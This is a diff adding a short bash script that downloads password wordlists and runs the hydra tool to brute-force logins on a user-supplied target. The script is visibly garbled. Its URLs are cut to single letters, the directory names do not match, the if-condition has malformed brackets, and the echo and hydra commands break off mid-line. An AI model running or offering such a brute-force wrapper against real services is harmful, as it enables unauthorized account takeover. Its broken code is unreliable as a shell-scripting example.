@@ -1,0 +1,21 @@
+#!/bin/bash
+alias wget='wget -N --cookies=on --keep-session-cookies'
+cd tlmp
+wget http://downloads.skullsecurity.org/passwords/j
+wget http://downloads.skullsecurity.org/passwords/5
+wget http://downloads.skullsecurity.org/passwords/f
+wget http://downloads.skullsecurity.org/passwords/t
+
+#bzip2 -d *.bz2
+#cat *.txt | sort -u -f >> ../hydra.dic
+#cd ..
+#yes|rm -r tmp
+
+
+if ［-z "$1" ] || [-z "$2" ] || -z "$3" ]
+        then
+        echo -e "You did not enter your target.\nPl"
+        read args
+        hydra -V -L ./hydra.dic -e ns -t 16 -f -m 
+        else
+        hydra -V -L ./hydra.dic -e ns -t 16 -f -m
